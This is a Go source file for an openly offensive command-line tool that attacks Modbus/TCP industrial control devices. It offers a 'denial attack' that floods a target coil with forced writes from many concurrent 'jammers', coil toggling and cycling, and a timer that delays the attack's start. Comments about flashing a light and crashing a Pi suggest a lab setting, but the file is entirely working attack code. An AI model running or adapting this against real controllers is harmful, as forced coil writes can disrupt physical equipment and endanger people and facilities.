package main

import (
	"fmt"
	"sync"
	"time"

	"github.com/goburrow/modbus" //Import the necessary modbus library
)

var wait sync.WaitGroup

func modbusConnection(ip_address string, port string) modbus.Client {
	target := ip_address + ":" + port //Send Modbus traffic the specified IP on the Modbus port
	handler := modbus.NewTCPClientHandler(target)
	handler.Timeout = 10 * time.Second

	err := handler.Connect()
	if err != nil {
		fmt.Print(err)
	}

	defer handler.Close()
	client := modbus.NewClient(handler)
	return client
}

// func toggle(ip_address string, port string, coil uint16, coil_value int, cycle bool, timeCycle int, cycleDelay int)
func timeDelay(timeMin int, ip_address string, port string, jamming int, runtime int, coil uint16, coil_val int, selector bool, cycle bool, timeCycle int, cycleDelay int) {
	timer2 := time.NewTimer(time.Duration(timeMin) * time.Minute)
	if selector {
		go func() {
			<-timer2.C
			fmt.Println("Begining toggle")
			go toggle(ip_address, port, coil, coil_val, cycle, timeCycle, cycleDelay) //cycle bool, timeCycle int, cycleDelay int)
		}()
	} else {
		go func() {
			<-timer2.C
			fmt.Println("Begining delayed attack")
			go denial(ip_address, port, jamming, runtime, coil, coil_val)
		}()
	}

}

func jammer(target modbus.Client, coil uint16, coil_value int, stopChannel chan bool) {
	for {
		select {
		case <-stopChannel:
			return
		default:
			if coil_value == 1 {
				results, err := target.WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
				if err != nil {
					fmt.Println(err)
					fmt.Println(results)
				}
			} else {
				results, err := target.WriteSingleCoil(coil, 0x0000)
				if err != nil {
					fmt.Println(err)
					fmt.Println(results)
				}
			}
		}
	}
}

func denial(ip_address string, port string, jamming int, runtime int, coil uint16, coil_val int) {
	client := modbusConnection(ip_address, port)
	stopChannel := make(chan bool)
	for i := 0; i < jamming; i++ {
		wait.Add(1)
		go jammer(client, uint16(coil), coil_val, stopChannel) //If you use modbusConnection(ip_address) instead of client you can crash the pi
	}

	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
	go func() {
		<-timer2.C
		fmt.Println("Denial attack completed")
		close(stopChannel)

	}()

	wait.Wait()
}

func toggle(ip_address string, port string, coil uint16, coil_value int, cycle bool, timeCycle int, cycleDelay int) {
	if cycle {
		var isBreak bool
		timer2 := time.NewTimer(time.Duration(timeCycle) * time.Second) //Do I want to use a timer or number of flashes?
		go func() {
			<-timer2.C
			fmt.Println("Ending toggle")
			isBreak = true //Breaks the light flashing
		}()
		for {
			results, err := modbusConnection(ip_address, port).WriteSingleCoil(coil, 0xFF00)
			time.Sleep(time.Duration(cycleDelay) * time.Second)
			result, err1 := modbusConnection(ip_address, port).WriteSingleCoil(coil, 0x0000)
			time.Sleep(time.Duration(cycleDelay) * time.Second)

			if err != nil {
				fmt.Println(err)
				fmt.Println(err1)
				fmt.Println(results)
				fmt.Println(result)
			}

			if isBreak {
				break
			}
		}
	} else {
		if coil_value == 1 {
			results, err := modbusConnection(ip_address, port).WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
			if err != nil {
				fmt.Println(err)
				fmt.Println(results)
			}
		} else {
			results, err := modbusConnection(ip_address, port).WriteSingleCoil(coil, 0x0000)
			if err != nil {
				fmt.Println(err)
				fmt.Println(results)
			}
		}
	}
}

func main() {
	for {
		var userSelection int
		fmt.Println("Enter: \n 1) For denial attack \n 2) Toggle \n 3) Stage an attack")
		fmt.Scanln(&userSelection)

		if userSelection == 1 {
			var ip_address string
			fmt.Println("Enter an ip address")
			fmt.Scanln(&ip_address)

			var port string
			fmt.Println("Enter a port (default Modbus port is 502)")
			fmt.Scanln(&port)

			var jamming int
			fmt.Println("Enter a number of jammers")
			fmt.Scanln(&jamming)

			var runtime int
			fmt.Println("Enter a runtime:")
			fmt.Scanln(&runtime)

			var coil uint16
			fmt.Println("Enter a coil:")
			fmt.Scanln(&coil)

			var coil_value int
			fmt.Println("Enter a coil value:")
			fmt.Scanln(&coil_value)

			go denial(ip_address, port, jamming, runtime, coil, coil_value)
		} else if userSelection == 2 {
			var timeCycle int
			var cycleDelay int
			var cycle bool
			fmt.Println("To cycle light enter 1, to toggle light enter 0")
			fmt.Scanln(&cycle)

			if cycle {
				fmt.Println("Enter how long to repeat cycle for (in seconds)")
				fmt.Scanln(&timeCycle)

				fmt.Println("Enter delay between cycle (in seconds)")
				fmt.Scanln(&cycleDelay)
			} else {
				timeCycle = 0
				cycleDelay = 0
			}

			var ip_address string
			fmt.Println("Enter an ip address")
			fmt.Scanln(&ip_address)

			var port string
			fmt.Println("Enter a port (default Modbus port is 502)")
			fmt.Scanln(&port)

			var coil uint16
			fmt.Println("Enter a coil:")
			fmt.Scanln(&coil)

			var coil_value int
			fmt.Println("Enter a coil value:")
			fmt.Scanln(&coil_value)

			go toggle(ip_address, port, coil, coil_value, cycle, timeCycle, cycleDelay)

		} else if userSelection == 3 {
			var runtime int
			var ip_address string
			var timeCycle int
			var cycleDelay int
			var cycle bool
			var jamming int

			var selector bool
			fmt.Println("Enter 1 for toggle/cycle or 0 for denial")
			fmt.Scanln(&selector)

			fmt.Println("Enter an ip address")
			fmt.Scanln(&ip_address)

			var port string
			fmt.Println("Enter a port (default Modbus port is 502)")
			fmt.Scanln(&port)

			var coil uint16
			fmt.Println("Enter a coil:")
			fmt.Scanln(&coil)

			var coil_value int
			fmt.Println("Enter a coil value:")
			fmt.Scanln(&coil_value)

			if selector {
				fmt.Println("Enter 1 to cycle, enter 0 for on/off")
				fmt.Scanln(&cycle)

				if cycle {
					fmt.Println("Enter how long to repeat cycle for (in seconds)")
					fmt.Scanln(&timeCycle)

					fmt.Println("Enter delay between cycle (in seconds)")
					fmt.Scanln(&cycleDelay)
				} else {
					timeCycle = 0
					cycleDelay = 0
					jamming = 0
				}
			} else {

				fmt.Println("Enter a number of jammers")
				fmt.Scanln(&jamming)

				fmt.Println("Enter a runtime (in minutes):")
				fmt.Scanln(&runtime)
			}

			var timeMin int
			fmt.Println("Enter how many minutes wait before starting attack:")
			fmt.Scanln(&timeMin)

			go timeDelay(timeMin, ip_address, port, jamming, runtime, coil, coil_value, selector, cycle, timeCycle, cycleDelay)
		}
	}
}
